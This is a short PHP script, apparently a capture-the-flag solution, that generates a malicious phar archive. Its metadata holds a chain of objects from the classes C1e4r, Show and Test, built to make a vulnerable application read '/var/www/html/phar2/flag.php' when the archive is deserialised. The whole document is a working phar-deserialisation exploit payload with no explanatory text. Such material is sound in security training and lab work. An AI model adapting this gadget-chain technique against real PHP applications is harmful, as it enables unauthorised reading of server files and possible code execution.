<?php
class C1e4r
{
    public $test;
    public $str;
}
class Show
{
    public $source;
    public $str;
    }
class Test
{
    public $file;
    public $params;
}

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$class1=new Test();
$class2=new Show;
$class3=new C1e4r();
$class1->params=array("source"=>"/var/www/html/phar2/flag.php");
$class2->str=array("str"=>$class1);
$class3->str=$class2;

$phar->setMetadata($class3);
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();
?>